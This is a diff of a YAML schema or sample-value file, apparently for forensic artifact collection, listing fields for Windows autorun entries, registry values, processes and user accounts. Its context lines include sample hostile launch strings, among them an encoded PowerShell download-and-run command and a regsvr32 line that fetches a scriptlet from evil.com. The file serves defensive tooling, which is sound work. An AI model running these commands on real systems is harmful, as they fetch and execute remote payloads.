@@ -37,14 +37,63 @@ authorized_keys entry:
   type_entry:
   - authorized_keys entry
 autorun entry:
+  arguments:
+  - ''
+  - /systemstartup
+  - /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
+  - --svc --appid={cc46080e-4c33-4981-859a-bba2f780f31e}
+  - --system --windows-service --service=update-internal --enable-logging --vmodule=*/components/winhttp
+  autorun_type:
+  - service
+  - run_key
+  entry:
+  - ''
+  - SecurityHealth
+  - Opera Browser Assistant
+  - Dropbox
+  image.exists:
+  - 'yes'
+  image.extension:
+  - .sys
+  - .exe
+  - .dll
+  - .SYS
+  image.magic_header:
+  - UNKNOWN
+  image.path:
+  - C:\WINDOWS\system32\dllhost.exe
+  - C:\Program Files\Dropbox\DropboxUpdater\123.0.6299.144\updater.exe
+  - C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
+  - C:\Program Files (x86)\Google\GoogleUpdater\148.0.7730.0\updater.exe
+  - C:\WINDOWS\system32\lsass.exe
+  image.size:
+  - '77824'
+  - '57344'
+  - '84200'
+  - '122880'
+  - '90112'
+  image.type:
+  - file
   launch_string:
   - C:\\Windows\\System32\\svchost.exe -k netsvcs
   - powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBwAHMAMQAnACkA
   - regsvr32 /s /n /i:http://evil.com/payload.sct scrobj.dll
+  - '"C:\Program Files\Dropbox\DropboxUpdater\123.0.6299.144\updater.exe" --system
+    --windows-service --se'
+  - '"C:\Program Files (x86)\Google\GoogleUpdater\148.0.7730.0\updater.exe" --system
+    --windows-service --'
   location:
   - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
   - HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
   - C:\\Users\\neo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
+  - LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+  - LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+  old_md5:
+  - e9659b4ed260c6557f99a5640297a80a
+  - 2fb23b6447d059c42d09c00065d988c3
+  - ec013a26b4ceea8505b5e06645a4cbf4
+  - 25736d2bb56dd3441600306bf62e0481
+  - 42266953a0cf902bac3db3c285119d1b
   type:
   - autorun entry
 cron job:
@@ -248,6 +297,13 @@ process:
   session:
   - ''
   - neo
+process start:
+  process:
+  - C:\Windows\SystemTemp\A01DF562-5405-4537-AFDB-16439A7DF2BE\MpSigStub.exe
+  - C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.449.79.0.exe
+  - C:\Windows\System32\la57setup.exe
+  - C:\Program Files\Virtio-Win\Balloon\blnsvr.exe
+  - C:\Windows\SystemTemp\dropbox_Unpacker_BeginUnzipping5092_115518982\DropboxClientInstaller.exe
 registry key:
   hive:
   - HKLM
@@ -273,18 +329,35 @@ registry value:
   - REG_DWORD
   - REG_EXPAND_SZ
   - REG_BINARY
+  key:
+  - SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\7520BD25F56FC5A41B3F7
+  - SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\BB31E568FDB1768409398
+  - SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib\009\Help
+  - SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib\CurrentLanguage\Help
+  - SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Perflib\009\Help
+  modified:
+  - '1601-01-01T01:00:00+01:00'
+  - '2026-03-29T12:13:58.0550089+02:00'
+  - '2026-03-31T23:37:31.226098+02:00'
   name:
   - SecurityHealth
   - OneDrive
   - MaliciousEntry
   path:
   - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth
+  size:
+  - '1205350'
+  - '599722'
+  - '1405042'
   type:
   - registry value
   value:
   - '%windir%\system32\SecurityHealthSystray.exe'
   - C:\Users\neo\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
   - powershell -enc ...
+  - 3\0The System performance object consists of counters that apply to more than
+    one instance of a comp
+  - u^$(xo!I@9{Ie[a[6=@@SQ)38QoA&AD[A1wmpNFWHreR',!=X90w6Tzj_1Zxkv=74A'pB?Nv`g3tLdq6o@6W47WgR?jw1[eJ0n(O
 scheduled task:
   commands:
   - C:\Windows\System32\svchost.exe -k netsvcs
@@ -415,6 +488,12 @@ windows user:
   account_expires:
   - never
   - '2026-12-31T23:59:59Z'
+  active:
+  - 'True'
+  bad_password_count:
+  - '0'
+  comment:
+  - ''
   description:
   - Built-in account for administering the computer/domain
   - ''
@@ -430,15 +509,30 @@ windows user:
   - Administrators
   - Users
   - Remote Desktop Users
+  is_admin:
+  - 'True'
+  - 'False'
   last_logon:
   - '2026-04-26T10:30:00Z'
   - never
+  - '2026-04-26T14:28:12+02:00'
+  - '2026-03-31T23:24:25+02:00'
+  locked:
+  - 'False'
   name:
   - Administrator
   - neo
   - florian
   - Guest
   - DefaultAccount
+  no_expire:
+  - 'True'
+  num_logons:
+  - '1203'
+  - '0'
+  pass_age:
+  - '6539359000000000'
+  - '2390831000000000'
   password_changeable:
   - 'true'
   - 'false'
@@ -453,3 +547,6 @@ windows user:
   - S-1-5-21-1234567890-1234567890-1234567890-1001
   type:
   - windows user
+  user:
+  - Administrator
+  - Guest
